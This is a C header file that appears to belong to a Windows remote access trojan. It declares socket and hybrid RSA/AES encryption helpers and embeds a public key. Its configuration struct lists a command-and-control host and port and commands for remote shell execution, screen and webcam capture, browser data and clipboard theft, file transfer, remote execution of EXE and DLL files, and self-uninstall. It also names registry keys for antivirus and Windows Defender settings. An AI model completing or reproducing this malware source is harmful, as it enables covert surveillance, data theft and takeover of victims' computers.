#ifndef UTILS_H
#define UTILS_H

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Base64
char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length);
unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length);

// String helpers
char* str_replace(const char* orig, const char* rep, const char* with);
void str_trim(char* s);

// Networking helper
void sock_send(SOCKET sock, HANDLE mutex, const char* msg);
void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg);

// Hybrid Encryption
#define RSA_PUB_KEY "-----BEGIN PUBLIC KEY-----\n"\
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuYRrLUofWNv/EU3mNLah\n"\
"JQb9i7dbOi35/KGzyYsPd2HcufAa36GvQowUhGQyIWDfXqes7MkTQOE6/oNed1Ri\n"\
"QqNJBI7dexup5W54G4NIzl8BuY34A0jxsrKvZ5ZfYm/hDXMG7i1Qmqz3q7YU4AMH\n"\
"lpIZkfHgcvDNTj5AosN88HRgvfo8M8l8U8+jdCbJa4LSBS7Q0gYwuzUJedm6Cw9Y\n"\
"MgSxi1Dlgy/t6S3M2bPx2EFGQttagPBL8LFT+kGPQSsRpTkniNLOME8Bmk5muQCV\n"\
"JIJDxn9zppu5zYYcDgzQLRPfN+VxoVIby9JapCMQBELyM2KponzjW7TEOKHkjRql\n"\
"9QIDAQAB\n"\
"-----END PUBLIC KEY-----"

typedef struct {
    unsigned char key[32];
    unsigned char iv[16];
} SessionKey;

char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem);
char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv);
unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv);

// Time helpers
void get_formatted_time(unsigned long long secs, char* out_buf);

// Config
typedef struct {
    char host[256];
    int port;

    // Command Strings
    char s_ping[16];
    char s_pong[16];
    char s_msg[16];
    char s_exec_ps[16];
    char s_exec_cmd[16];
    char s_ps_out[32];
    char s_cmd_out[32];
    char s_scr_stop[32];
    char s_cam_stop[32];
    char s_tasklist[32];
    char s_taskkill[32];
    char s_ls[16];
    char s_ls_res[32];
    char s_download[32];
    char s_delete[16];
    char s_mkdir[16];
    char s_upload[16];
    char s_rename[16];
    char s_rfe_exe[16];
    char s_rfe_dll[16];
    char s_browser[32];
    char s_clip_get[32];
    char s_clip_set[32];
    char s_uninstall[16];
    char s_close[16];
    char s_reconnect[16];
    char s_set_delay[16];
    char s_scr_start[32];
    char s_cam_start[32];
    char s_sysinfo[32];
    char s_response[16];
    char s_command[16];
    char s_session[16];

    // Registry & System Strings
    char s_reg_win_key[128];
    char s_reg_prod_name[32];
    char s_reg_build[32];
    char s_reg_display[32];
    char s_reg_release[32];
    char s_reg_av_key[64];
    char s_reg_defender_key[128];
    char s_reg_dis_spy[32];
    char s_reg_gpu_key[128];
    char s_reg_gpu_desc[32];
    char s_reg_cpu_key[128];
    char s_reg_cpu_name[32];

    // HTTP/IP Strings
    char s_http_ua[32];
    char s_http_host[32];
    char s_http_path[32];
} Config;

extern Config g_conf;
void load_config_from_resource();

#endif
